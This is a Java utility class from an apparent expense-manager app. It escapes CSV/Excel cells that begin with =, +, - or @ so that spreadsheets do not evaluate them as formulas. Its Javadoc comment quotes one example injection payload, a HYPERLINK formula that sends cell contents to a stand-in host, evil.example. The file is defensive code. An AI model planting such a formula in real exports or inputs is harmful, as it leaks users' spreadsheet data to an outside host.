package com.family.expensemanager.common.report;

/**
 * Neutralizes CSV/Excel "formula injection" (OWASP): a cell whose text starts with {@code =}, {@code +},
 * {@code -} or {@code @} is interpreted as a formula by Excel/LibreOffice/Google Sheets when the file is
 * opened, not shown as literal text — a user-controlled field like a transaction note (free text, no
 * character restriction) exported unescaped could smuggle in something like
 * {@code =HYPERLINK("http://evil.example?"&A1,"Click")} or a DDE command. Prefixing a single quote is the
 * standard fix: every spreadsheet program renders the value as plain text starting with that character,
 * dropping the quote itself, and never evaluates it as a formula.
 */
public final class FormulaInjectionGuard {

    private static final String DANGEROUS_LEADING_CHARS = "=+-@";

    private FormulaInjectionGuard() {
    }

    public static String sanitize(String value) {
        if (value == null || value.isEmpty()) {
            return value;
        }
        return DANGEROUS_LEADING_CHARS.indexOf(value.charAt(0)) >= 0 ? "'" + value : value;
    }
}
